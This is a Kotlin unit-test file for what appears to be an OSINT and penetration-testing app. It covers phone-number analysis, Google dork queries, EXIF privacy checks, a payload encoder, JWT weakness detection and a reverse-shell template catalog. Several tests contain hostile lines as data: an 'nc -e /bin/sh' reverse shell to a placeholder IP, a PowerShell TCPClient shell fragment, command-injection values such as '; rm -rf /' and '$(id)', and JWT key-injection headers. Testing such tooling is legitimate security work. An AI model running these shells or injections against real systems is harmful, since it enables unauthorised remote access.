package com.fearmikey.rf_reapr.domain.service

import com.fearmikey.rf_reapr.domain.model.DorkCategory
import com.fearmikey.rf_reapr.domain.model.DorkScope
import com.fearmikey.rf_reapr.domain.model.ExifMetadata
import com.fearmikey.rf_reapr.domain.model.GoogleDorkDatabase
import com.fearmikey.rf_reapr.domain.model.PayloadFormat
import com.fearmikey.rf_reapr.domain.model.PhoneValidity
import com.fearmikey.rf_reapr.domain.model.RiskLevel
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertThrows
import org.junit.Assert.assertTrue
import org.junit.Test
import java.util.Base64
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

/** Phone, dork, EXIF, payload / JWT and reverse-shell helpers. */
class OsintToolsTest {

    // ---- Phone numbers ----------------------------------------------------------------

    private fun phone(input: String, default: String = "+1") = PhoneNumberAnalyzer.analyze(input, default).result!!

    @Test
    fun `parses a US number`() {
        val result = phone("+1 415 555 2671")
        assertEquals("+14155552671", result.e164)
        assertEquals("US", result.countryIso)
        assertEquals("United States", result.countryName)
        assertEquals("4155552671", result.nationalNumber)
        assertEquals("+1 (415) 555-2671", result.formattedInternational)
        assertEquals(PhoneValidity.VALID_LENGTH, result.validity)
        assertEquals("Area code 415", result.region)
        assertTrue(result.notes.isEmpty())
        assertTrue(result.osintLinks.any { it.url == "https://wa.me/14155552671" })
        assertTrue(result.osintLinks.any { it.url == "tel:+14155552671" && it.isDirectAppAction })
    }

    @Test
    fun `tells nanp countries apart by area code`() {
        val canada = phone("(416) 555-0123")
        assertEquals("CA", canada.countryIso)
        assertTrue(canada.notes.any { it.contains("fiction") })
        assertEquals("JM", phone("876-555-1234", "1").countryIso)
        assertEquals("PR", phone("+1 787 555 1234").countryIso)

        val tollFree = phone("1-800-FLOWERS")
        assertEquals("+18003569377", tollFree.e164)
        assertEquals("Toll-Free", tollFree.estimatedLineType)
        assertTrue(tollFree.notes.any { it.contains("Vanity") })

        assertEquals(PhoneValidity.INVALID, phone("+1 115 555 2671").validity)
        assertEquals(PhoneValidity.UNUSUAL_LENGTH, phone("+1 415 555").validity)
    }

    @Test
    fun `handles national formats and trunk prefixes`() {
        val uk = phone("07911 123456", "+44")
        assertEquals("+447911123456", uk.e164)
        assertEquals("GB", uk.countryIso)
        assertEquals("Mobile", uk.estimatedLineType)
        assertEquals("+44 7911 123456", uk.formattedInternational)
        assertEquals(PhoneValidity.VALID_LENGTH, uk.validity)

        assertEquals("+447911123456", phone("0044 7911 123456").e164)
        assertEquals("+447911123456", phone("011 44 7911 123456").e164)
        assertEquals("KZ", phone("+7 701 123 4567").countryIso)
        val russia = phone("8 (495) 123-45-67", "+7")
        assertEquals("+74951234567", russia.e164)
        assertEquals("RU", russia.countryIso)
        // Italian numbers keep the leading zero after the country code.
        assertEquals("+390612345678", phone("06 1234 5678", "+39").e164)
        assertEquals("JE", phone("+44 1534 123456").countryIso)
    }

    @Test
    fun `extensions and errors`() {
        val withExt = phone("+1 415 555 2671 ext. 42")
        assertEquals("42", withExt.extension)
        assertEquals("+14155552671", withExt.e164)

        assertNotNull(PhoneNumberAnalyzer.analyze("123", "+1").error)
        assertTrue(PhoneNumberAnalyzer.analyze("+999 12345678", "+1").error!!.contains("not an assigned"))
        assertNotNull(PhoneNumberAnalyzer.analyze("+1 2345678901234567", "+1").error)
        val empty = PhoneNumberAnalyzer.analyze("  ", "+1")
        assertNull(empty.result)
        assertNull(empty.error)
    }

    @Test
    fun `country table and search variants`() {
        assertEquals("IE", PhoneNumberAnalyzer.countryForDigits("3531234567")!!.iso)
        assertEquals("GB", PhoneNumberAnalyzer.countryForDigits("441234")!!.iso)
        assertNull(PhoneNumberAnalyzer.countryForDigits("999"))
        val countries = PhoneNumberAnalyzer.countries
        assertTrue(countries.size > 200)
        assertEquals(countries.size, countries.map { it.callingCode }.distinct().size)
        assertTrue(countries.all { it.callingCode.all(Char::isDigit) && it.iso.length == 2 && it.name.isNotBlank() })
        // E.164 country codes are prefix-free; a table typo would break longest-prefix matching.
        val codes = countries.map { it.callingCode }.toSet()
        assertTrue(codes.none { code -> (1 until code.length).any { code.take(it) in codes } })

        val variants = PhoneNumberAnalyzer.searchVariants("1", "4155552671")
        assertEquals("+14155552671", variants.first())
        assertTrue(variants.containsAll(listOf("(415) 555-2671", "415-555-2671", "415.555.2671")))
        assertTrue(PhoneNumberAnalyzer.searchVariants("44", "7911123456").contains("07911123456"))
        assertEquals("\"a\" OR \"b\"", PhoneNumberAnalyzer.exactMatchQuery(listOf("a", "b")))
        assertTrue(PhoneNumberAnalyzer.report(phone("+1 415 555 2671")).contains("Phone number: +14155552671"))
    }

    // ---- Dorks ------------------------------------------------------------------------

    @Test
    fun `normalises dork targets`() {
        assertEquals("www.example.com", DorkQueryBuilder.normalizeTarget("https://WWW.Example.com/path?x=1"))
        assertEquals("example.com", DorkQueryBuilder.normalizeTarget("*.example.com"))
        assertEquals("example.com", DorkQueryBuilder.normalizeTarget("example.com:8443"))
        assertEquals("", DorkQueryBuilder.normalizeTarget("   "))
        assertNull(DorkQueryBuilder.normalizeTarget("exa mple"))
        assertNull(DorkQueryBuilder.normalizeTarget("example.com\" OR 1"))
    }

    @Test
    fun `scopes dorks to a target`() {
        assertEquals(
            "site:example.com (inurl:wp-login.php OR inurl:wp-admin)",
            DorkQueryBuilder.build("inurl:wp-login.php OR inurl:wp-admin", "example.com")
        )
        assertEquals(
            "site:example.com intitle:\"phpinfo()\" \"PHP Version\"",
            DorkQueryBuilder.build("intitle:\"phpinfo()\" \"PHP Version\"", "example.com")
        )
        assertEquals("x OR y", DorkQueryBuilder.build("x OR y", ""))
        assertEquals("site:t.com \"a OR b\"", DorkQueryBuilder.build("\"a OR b\"", "t.com"))
        assertEquals("site:t.com (a OR b)", DorkQueryBuilder.build("(a OR b)", "t.com"))
        assertEquals("site:t.com (a OR b) (c OR d)", DorkQueryBuilder.build("(a OR b) (c OR d)", "t.com"))
        assertEquals("site:t.com ((a) OR (b))", DorkQueryBuilder.build("(a) OR (b)", "t.com"))
        assertEquals("site:t.com", DorkQueryBuilder.build("  ", "t.com"))
    }

    @Test
    fun `third party dorks use the target as a keyword`() {
        assertEquals(
            "(site:pastebin.com OR site:paste.ee) \"example.com\"",
            DorkQueryBuilder.build("site:pastebin.com OR site:paste.ee", "example.com", DorkScope.KEYWORD)
        )
        assertEquals("site:trello.com \"example.com\"", DorkQueryBuilder.build("site:trello.com", "example.com", DorkScope.KEYWORD))
        assertEquals("site:github.com password \"example.com\"", DorkQueryBuilder.buildCustom("site:github.com password", "example.com"))
        assertEquals("site:example.com filetype:pdf", DorkQueryBuilder.buildCustom("filetype:pdf", "example.com"))

        // A second site: operator would make the query match nothing, so the scope must follow the query.
        GoogleDorkDatabase.dorks.forEach { dork ->
            assertEquals(dork.title, dork.query.contains("site:"), dork.scope == DorkScope.KEYWORD)
        }
        assertEquals(GoogleDorkDatabase.dorks.size, GoogleDorkDatabase.dorks.map { it.title }.distinct().size)
        assertTrue(DorkCategory.entries.all { c -> GoogleDorkDatabase.dorks.any { it.category == c } })
    }

    @Test
    fun `search urls and filtering`() {
        assertEquals("https://www.google.com/search?q=a+b", SearchEngine.GOOGLE.url("a b"))
        assertTrue(SearchEngine.DUCKDUCKGO.url("site:x.com \"y\"").startsWith("https://duckduckgo.com/?q=site%3Ax.com"))
        val logins = DorkQueryBuilder.filter(GoogleDorkDatabase.dorks, DorkCategory.LOGINS, "")
        assertTrue(logins.isNotEmpty() && logins.all { it.category == DorkCategory.LOGINS })
        assertTrue(DorkQueryBuilder.filter(GoogleDorkDatabase.dorks, null, "PHPMYADMIN").isNotEmpty())
        assertTrue(DorkQueryBuilder.filter(GoogleDorkDatabase.dorks, null, "zzzz-no-match").isEmpty())
    }

    // ---- EXIF -------------------------------------------------------------------------

    @Test
    fun `flags location and device identifiers`() {
        val metadata = ExifMetadata(
            fileName = "IMG_1.jpg", sha256 = "abc123", make = "Canon", model = "EOS R5", software = "Firmware 1.8",
            dateTimeOriginal = "2024:03:09 14:05:30", latitude = 40.446111, longitude = -79.982222, altitude = 310.0,
            hasThumbnail = true,
            rawTags = mapOf(
                "BodySerialNumber" to "012345", "Artist" to "Jane Doe", "GPSDateStamp" to "2024:03:09",
                "GPSTimeStamp" to "14/1,5/1,30/1", "OffsetTimeOriginal" to "-05:00", "MakerNote" to "…"
            )
        )
        val findings = ExifPrivacyAnalyzer.analyze(metadata)
        assertEquals("Exact location embedded", findings.first().title)
        assertEquals(RiskLevel.HIGH, ExifPrivacyAnalyzer.overallRisk(findings))
        assertTrue(findings.first().detail.contains("40.446111, -79.982222"))
        assertTrue(findings.first().detail.contains("GPS time 2024-03-09 14:05:30 UTC"))
        val titles = findings.map { it.title }
        assertTrue(titles.containsAll(listOf("Device serial number", "Owner or author named", "Embedded thumbnail", "Capture time recorded", "Device model identified", "Manufacturer MakerNote")))
        assertTrue(findings.zipWithNext().all { (a, b) -> a.severity >= b.severity })

        val report = ExifPrivacyAnalyzer.report(metadata)
        assertTrue(report.contains("SHA-256: abc123"))
        assertTrue(report.contains("Exact location embedded"))
    }

    @Test
    fun `clean and partial metadata`() {
        assertTrue(ExifPrivacyAnalyzer.analyze(ExifMetadata()).isEmpty())
        assertNull(ExifPrivacyAnalyzer.overallRisk(emptyList()))
        val partial = ExifPrivacyAnalyzer.analyze(ExifMetadata(rawTags = mapOf("GPSDateStamp" to "2024:03:09")))
        assertEquals("Partial GPS data", partial.single().title)
        assertTrue(ExifPrivacyAnalyzer.report(ExifMetadata(fileName = "x.png")).contains("No privacy-relevant metadata found."))
    }

    @Test
    fun `coordinate and timestamp formatting`() {
        assertEquals("40°26'46.0\"N 79°58'56.0\"W", ExifPrivacyAnalyzer.formatDms(40.446111, -79.982222))
        // 59.9996" must carry into the next minute/degree instead of printing 60.0".
        assertEquals("10°00'00.0\"N 21°00'00.0\"E", ExifPrivacyAnalyzer.formatDms(10.0, 20.9999999))
        assertEquals("-33.865143, 151.209900", ExifPrivacyAnalyzer.formatDecimal(-33.865143, 151.2099))
        assertEquals(
            "2024-03-09 14:05:30 UTC",
            ExifPrivacyAnalyzer.gpsTimestampUtc(mapOf("GPSDateStamp" to "2024:03:09", "GPSTimeStamp" to "14:05:30"))
        )
        assertEquals("2024-03-09 UTC", ExifPrivacyAnalyzer.gpsTimestampUtc(mapOf("GPSDateStamp" to "2024:03:09")))
        assertNull(ExifPrivacyAnalyzer.gpsTimestampUtc(emptyMap()))
        assertEquals(2.8, ExifPrivacyAnalyzer.parseRational("28/10")!!, 1e-9)
        assertNull(ExifPrivacyAnalyzer.parseRational("1/0"))
        assertNull(ExifPrivacyAnalyzer.parseRational("x"))
        assertTrue(ExifPrivacyAnalyzer.mapUrl(1.5, -2.25).contains("mlat=1.500000&mlon=-2.250000"))
    }

    @Test
    fun `editing indicators`() {
        val edited = ExifMetadata(
            make = "Apple", software = "Adobe Photoshop 25.0",
            rawTags = mapOf("DateTimeOriginal" to "2024:01:01 10:00:00", "DateTime" to "2024:01:05 09:00:00")
        )
        val indicators = ExifPrivacyAnalyzer.editingIndicators(edited)
        assertTrue(indicators.any { it.contains("Photoshop") })
        assertTrue(indicators.any { it.contains("modified") })
        assertTrue(ExifPrivacyAnalyzer.editingIndicators(ExifMetadata(make = "Apple", software = "17.4")).isEmpty())
        assertTrue(ExifPrivacyAnalyzer.editingIndicators(ExifMetadata(rawTags = mapOf("Orientation" to "1"))).any { it.contains("stripped") })
    }

    // ---- Payload codec ----------------------------------------------------------------

    private fun roundTrip(text: String, format: PayloadFormat) =
        assertEquals(format.name, text, PayloadCodec.decode(PayloadCodec.encode(text, format), format))

    @Test
    fun `encodes known vectors`() {
        assertEquals("SGVsbG8=", PayloadCodec.encode("Hello", PayloadFormat.BASE64))
        assertEquals("Pj4-", PayloadCodec.encode(">>>", PayloadFormat.BASE64_URL))
        assertEquals("MZXW6YTBOI======", PayloadCodec.encode("foobar", PayloadFormat.BASE32))
        assertEquals("MY======", PayloadCodec.encode("f", PayloadFormat.BASE32))
        assertEquals("4869", PayloadCodec.encode("Hi", PayloadFormat.HEX))
        assertEquals("a%20b%26c%3Dd%2F%C3%A9", PayloadCodec.encode("a b&c=d/é", PayloadFormat.URL_ENCODE))
        assertEquals("%61%62", PayloadCodec.encode("ab", PayloadFormat.URL_ENCODE_ALL))
        assertEquals("&lt;a href=&quot;x&quot;&gt;&#39;&amp;&#xe9;", PayloadCodec.encode("<a href=\"x\">'&é", PayloadFormat.HTML_ENTITIES))
        assertEquals("\\u0041\\u003c", PayloadCodec.encode("A<", PayloadFormat.UNICODE_ESCAPE))
        assertEquals("65,66", PayloadCodec.encode("AB", PayloadFormat.CHAR_CODES))
        assertEquals("01000001", PayloadCodec.encode("A", PayloadFormat.BINARY))
        assertEquals("Uryyb", PayloadCodec.encode("Hello", PayloadFormat.ROT13))
    }

    @Test
    fun `decodes lenient input`() {
        assertEquals("Hello", PayloadCodec.decode("SGVsbG8", PayloadFormat.BASE64))
        assertEquals(">>>", PayloadCodec.decode("Pj4+", PayloadFormat.BASE64_URL))
        assertEquals(">>>", PayloadCodec.decode("Pj4-", PayloadFormat.BASE64))
        assertEquals("foobar", PayloadCodec.decode("mzxw6ytboi", PayloadFormat.BASE32))
        assertEquals("Hi", PayloadCodec.decode("48 69", PayloadFormat.HEX))
        assertEquals("Hi", PayloadCodec.decode("0x48,0x69", PayloadFormat.HEX))
        assertEquals("Hi", PayloadCodec.decode("\\x48\\x69", PayloadFormat.HEX))
        // Entities are decoded exactly once: "&amp;amp;" is the text "&amp;", not "&".
        assertEquals("<b> &amp; AB  ", PayloadCodec.decode("&lt;b&gt; &amp;amp; &#65;&#x42; &nbsp;", PayloadFormat.HTML_ENTITIES))
        assertEquals("A<", PayloadCodec.decode("\\u0041\\x3c", PayloadFormat.UNICODE_ESCAPE))
        assertEquals("AB", PayloadCodec.decode("65, 66", PayloadFormat.CHAR_CODES))
        assertEquals("AB", PayloadCodec.decode("0100000101000010", PayloadFormat.BINARY))
        assertTrue(PayloadCodec.decode("ff", PayloadFormat.HEX).startsWith("[binary data, 1 bytes]"))
    }

    @Test
    fun `round trips every format`() {
        val samples = listOf("Hello, World!", "<script>alert('xss')</script>", "ünïcödé ✓ 😀", "a=1&b=2 c%20d", "")
        PayloadFormat.entries.forEach { format -> samples.forEach { roundTrip(it, format) } }
    }

    @Test
    fun `rejects malformed input with a message`() {
        listOf(
            "abc" to PayloadFormat.HEX, "zz" to PayloadFormat.HEX, "!!!!" to PayloadFormat.BASE64, "A" to PayloadFormat.BASE64,
            "1!1" to PayloadFormat.BASE32, "%zz" to PayloadFormat.URL_ENCODE, "abc" to PayloadFormat.CHAR_CODES,
            "0102" to PayloadFormat.BINARY
        ).forEach { (input, format) ->
            val error = assertThrows("$input as $format", IllegalArgumentException::class.java) { PayloadCodec.decode(input, format) }
            assertFalse(error.message.isNullOrBlank())
        }
    }

    @Test
    fun `detects likely encodings`() {
        assertTrue(PayloadFormat.BASE64 in PayloadCodec.detect("SGVsbG8gV29ybGQ="))
        val hex = PayloadCodec.detect("48656c6c6f")
        assertTrue(PayloadFormat.HEX in hex && PayloadFormat.BASE64 !in hex)
        assertTrue(PayloadFormat.URL_ENCODE in PayloadCodec.detect("%3Cscript%3E"))
        assertTrue(PayloadFormat.HTML_ENTITIES in PayloadCodec.detect("&lt;x&gt;"))
        assertTrue(PayloadFormat.BINARY in PayloadCodec.detect("01000001 01000010"))
        assertTrue(PayloadCodec.detect("hello world").isEmpty())
    }

    // ---- JWT --------------------------------------------------------------------------

    private fun b64(text: String) = Base64.getUrlEncoder().withoutPadding().encodeToString(text.toByteArray())

    private fun jwt(header: String, payload: String, secret: String? = null): String {
        val signingInput = "${b64(header)}.${b64(payload)}"
        if (secret == null) return "$signingInput."
        val mac = Mac.getInstance("HmacSHA256").apply { init(SecretKeySpec(secret.toByteArray(), "HmacSHA256")) }
        return signingInput + "." + Base64.getUrlEncoder().withoutPadding().encodeToString(mac.doFinal(signingInput.toByteArray()))
    }

    private val now = 1_700_000_100_000L

    @Test
    fun `inspects a signed token`() {
        val token = jwt("""{"alg":"HS256","typ":"JWT"}""", """{"sub":"42","iss":"https://idp.test","aud":["a","b"],"iat":1699990000,"exp":1700003600,"role":"admin"}""", "secret")
        val result = JwtAnalyzer.inspect("Bearer $token", now)!!
        assertTrue(result.isValidJwt)
        assertEquals("HS256", result.algorithm)
        assertEquals("JWT", result.type)
        assertEquals("a, b", result.audience)
        assertEquals("42", result.subject)
        assertEquals(false, result.isExpired)
        assertEquals("Valid (expires in 0h 58m)", result.expirationRelative)
        assertEquals("2023-11-14 23:13:20 UTC", result.expiresAtFormatted)
        assertEquals(mapOf("role" to "admin"), result.customClaims)
        assertTrue(result.isHmac)
        assertEquals(listOf("Symmetric signature (HS256)"), result.findings.map { it.title })

        assertEquals(true, JwtAnalyzer.verifyHmac(token, "secret"))
        assertEquals(false, JwtAnalyzer.verifyHmac(token, "wrong"))
        assertEquals(false, JwtAnalyzer.verifyHmac(token, ""))
        assertTrue(JwtAnalyzer.looksLikeJwt(token))
        assertFalse(JwtAnalyzer.looksLikeJwt("hello.world"))
    }

    @Test
    fun `flags weak tokens`() {
        val unsigned = JwtAnalyzer.inspect(jwt("""{"alg":"none"}""", """{"sub":"1","password":"hunter2"}"""), now)!!
        assertEquals(RiskLevel.CRITICAL, unsigned.findings.first().severity)
        assertTrue(unsigned.findings.first().title.startsWith("Unsigned token"))
        val titles = unsigned.findings.map { it.title }
        assertTrue(titles.contains("No expiration (exp)"))
        assertTrue(titles.any { it.startsWith("Sensitive-looking claims") })
        assertFalse(unsigned.isHmac)
        assertNull(JwtAnalyzer.verifyHmac(jwt("""{"alg":"none"}""", "{}"), "x"))

        val expired = JwtAnalyzer.inspect(jwt("""{"alg":"HS256"}""", """{"exp":"1700000000"}""", "k"), now)!!
        assertEquals(true, expired.isExpired)
        assertTrue(expired.expirationRelative!!.startsWith("Expired"))
        assertTrue(expired.findings.any { it.title == "Token expired" })

        val longLived = JwtAnalyzer.inspect(jwt("""{"alg":"HS256"}""", """{"iat":1700000000,"exp":1707776000}""", "k"), now)!!
        assertTrue(longLived.findings.any { it.title == "Long-lived token" })

        val keyTricks = JwtAnalyzer.inspect(
            jwt("""{"alg":"RS256","kid":"../../dev/null","jku":"https://evil.test/jwks.json"}""", """{"exp":1700003600}""", "k"), now
        )!!
        assertEquals("../../dev/null", keyTricks.keyId)
        assertTrue(keyTricks.findings.any { it.title == "Header supplies its own key (jku)" })
        assertTrue(keyTricks.findings.any { it.title == "Unusual characters in key ID" })
        assertFalse(keyTricks.isHmac)
        assertNull(JwtAnalyzer.verifyHmac(jwt("""{"alg":"RS256"}""", "{}", "k"), "k"))

        val missingSignature = JwtAnalyzer.inspect(jwt("""{"alg":"RS256"}""", """{"exp":1700003600}"""), now)!!
        assertTrue(missingSignature.findings.any { it.title == "Signature missing" })
    }

    @Test
    fun `rejects things that are not readable tokens`() {
        assertNull(JwtAnalyzer.inspect("  ", now))
        val jwe = JwtAnalyzer.inspect("a.b.c.d.e", now)!!
        assertFalse(jwe.isValidJwt)
        assertTrue(jwe.errorMessage!!.contains("JWE"))
        assertFalse(JwtAnalyzer.inspect("abc", now)!!.isValidJwt)
        assertFalse(JwtAnalyzer.inspect("${b64("not json")}.${b64("{}")}.x", now)!!.isValidJwt)
        assertFalse(JwtAnalyzer.inspect("${b64("[1]")}.${b64("{}")}.x", now)!!.isValidJwt)
    }

    // ---- Reverse shells ---------------------------------------------------------------

    @Test
    fun `validates listener address and port`() {
        assertNull(ReverseShellCatalog.hostError("10.0.0.1"))
        assertNull(ReverseShellCatalog.hostError(" attacker.example.com "))
        listOf("", "10.0.0.1; rm -rf /", "999.1.1.1", "10.0.0", "a b", "host\"", "\$(id)").forEach {
            assertNotNull(it, ReverseShellCatalog.hostError(it))
        }
        assertEquals(4444, ReverseShellCatalog.parsePort(" 4444 "))
        listOf("0", "65536", "abc", "", "-1").forEach { assertNull(it, ReverseShellCatalog.parsePort(it)) }
        assertNotNull(ReverseShellCatalog.portNote(443))
        assertNull(ReverseShellCatalog.portNote(4444))
    }

    @Test
    fun `renders every template completely`() {
        ReverseShellCatalog.templates.forEach { t ->
            val command = ReverseShellCatalog.render(t.template, "10.9.8.7", 4444, "/bin/bash")
            assertFalse(t.name, command.contains("{ip}") || command.contains("{port}") || command.contains("{shell}"))
            assertTrue(t.name, command.contains("10.9.8.7") && command.contains("4444"))
        }
        ReverseShellCatalog.listeners.forEach { l ->
            assertTrue(l.name, ReverseShellCatalog.render(l.template, "10.9.8.7", 4444).contains("4444"))
        }
        assertEquals(ReverseShellCatalog.templates.size, ReverseShellCatalog.templates.map { it.name }.distinct().size)

        // An unknown shell path must never be interpolated into a command.
        assertEquals("nc -e /bin/sh 10.0.0.1 9001", ReverseShellCatalog.render("nc -e {shell} {ip} {port}", "10.0.0.1", 9001, "/tmp/x; id"))
        val powershell = ReverseShellCatalog.templates.first { it.name == "PowerShell" }
        assertTrue(ReverseShellCatalog.render(powershell.template, "10.0.0.1", 9001).contains("\$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',9001)"))
        assertEquals("a%20b%26c", ReverseShellCatalog.urlEncoded("a b&c"))
    }

    @Test
    fun `filters templates`() {
        val windows = ReverseShellCatalog.filter(ShellPlatform.WINDOWS, "")
        assertTrue(windows.isNotEmpty() && windows.all { it.platform == ShellPlatform.WINDOWS })
        assertEquals(listOf("Python 3"), ReverseShellCatalog.filter(null, "python").map { it.name })
        assertEquals(ReverseShellCatalog.templates.size, ReverseShellCatalog.filter(null, "").size)
    }
}
